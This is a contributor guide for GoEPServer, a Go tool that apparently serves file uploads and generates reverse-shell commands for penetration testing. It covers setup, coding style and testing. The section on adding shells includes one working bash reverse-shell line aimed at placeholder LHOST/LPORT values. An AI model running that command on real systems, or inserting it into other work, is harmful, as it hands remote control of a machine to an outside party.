# Contributing to GoEPServer

Thank you for your interest in contributing to GoEPServer! This document provides guidelines for contributing to the project.

## How to Contribute

### Reporting Bugs

Before creating bug reports, please check the existing issues to avoid duplicates. When creating a bug report, please include:

- **Description**: A clear and concise description of the bug
- **Steps to Reproduce**: Step-by-step instructions to reproduce the issue
- **Expected Behavior**: What you expected to happen
- **Actual Behavior**: What actually happened
- **Environment**: OS, Go version, browser (if applicable)
- **Screenshots**: If applicable, add screenshots to help explain the problem

### Suggesting Enhancements

Enhancement suggestions are welcome! Please include:

- **Description**: A clear and concise description of the enhancement
- **Use Case**: Explain why this enhancement would be useful
- **Implementation**: If you have ideas on how to implement it

### Pull Requests

1. **Fork the repository** and create your branch from `main`
2. **Make your changes** following the coding guidelines below
3. **Test your changes** thoroughly
4. **Update documentation** if needed
5. **Create a pull request** with a clear title and description

## Development Setup

### Prerequisites

- Go 1.21 or higher
- Git

### Getting Started

```bash
# Clone your fork
git clone https://github.com/your-username/goepserver.git
cd goepserver

# Build the project
./build.sh

# Run the server
./goepserver
```

### Project Structure

```
goepserver/
├── cmd/goepserver/          # Application entry point
├── internal/                # Internal packages
│   ├── assets/             # Embedded web assets
│   ├── config/             # Configuration
│   ├── server/             # HTTP server
│   ├── models/             # Data models
│   └── utils/              # Utilities
├── web/                    # Web assets
│   ├── templates/          # HTML templates
│   └── static/             # CSS, JS, images
└── build.sh                # Build script
```

## Coding Guidelines

### Go Code

- Follow the [Go Code Review Comments](https://github.com/golang/go/wiki/CodeReviewComments)
- Use `go fmt` to format your code
- Use `go vet` to check for common errors
- Add comments for exported functions and types
- Write tests for new functionality

### JavaScript Code

- Use modern JavaScript (ES6+) features
- Follow consistent indentation (2 spaces)
- Use meaningful variable names
- Add comments for complex logic
- Test in multiple browsers

### CSS Code

- Use CSS custom properties (variables) for themes
- Follow BEM methodology when possible
- Use modern CSS features (Grid, Flexbox)
- Ensure responsive design
- Test in both light and dark themes

### HTML Templates

- Use semantic HTML elements
- Ensure accessibility compliance
- Follow consistent indentation
- Use Go template syntax properly

## Adding New Features

### Adding New Reverse Shells

1. **Edit the shell data**: Update `web/static/js/reverse-shell.js`
2. **Add to the appropriate category**: reverse, bind, msfvenom, or hoaxshell
3. **Include proper metadata**: name, command, description, os, type
4. **Test the shell**: Ensure it works as expected

Example shell entry:
```javascript
{
    name: "Bash TCP",
    command: "bash -i >& /dev/tcp/LHOST/LPORT 0>&1",
    description: "Standard bash reverse shell",
    os: ["linux", "macos"],
    type: "bash"
}
```

### Adding New Server Features

1. **Create handlers**: Add new HTTP handlers in `internal/server/`
2. **Add routes**: Update the router in `setupRoutes()`
3. **Add templates**: Create HTML templates in `web/templates/`
4. **Add styles**: Update CSS in `web/static/css/`
5. **Add JavaScript**: Update or create JS files in `web/static/js/`

## Testing

### Manual Testing

1. **Build the project**: `./build.sh`
2. **Run the server**: `./goepserver`
3. **Test web interface**: Open `http://localhost:8080`
4. **Test file upload**: Upload files via web and CLI
5. **Test reverse shell generator**: Generate and copy various shells
6. **Test themes**: Switch between light and dark modes
7. **Test responsiveness**: Check mobile and desktop layouts

### Cross-Platform Testing

Use the cross-platform build script:

```bash
./build-cross-platform.sh
```

Test binaries on different platforms if possible.

## Documentation

- Update the README.md if you add new features
- Add inline code comments for complex logic
- Update the CHANGELOG.md for significant changes
- Create or update documentation for new APIs

## Commit Messages

Use clear and descriptive commit messages:

- `feat: add new reverse shell category`
- `fix: resolve upload issue on Windows`
- `docs: update README with new features`
- `style: improve dark theme colors`
- `refactor: simplify template rendering`

## Review Process

1. **Automated checks**: PRs will be checked for build success
2. **Code review**: Maintainers will review your code
3. **Testing**: New features should be tested
4. **Documentation**: Ensure docs are updated
5. **Merge**: Once approved, your PR will be merged

## Questions?

If you have questions about contributing, please:

1. Check the existing issues and discussions
2. Create a new issue with the "question" label
3. Reach out to the maintainers

Thank you for contributing to GoEPServer! 🚀
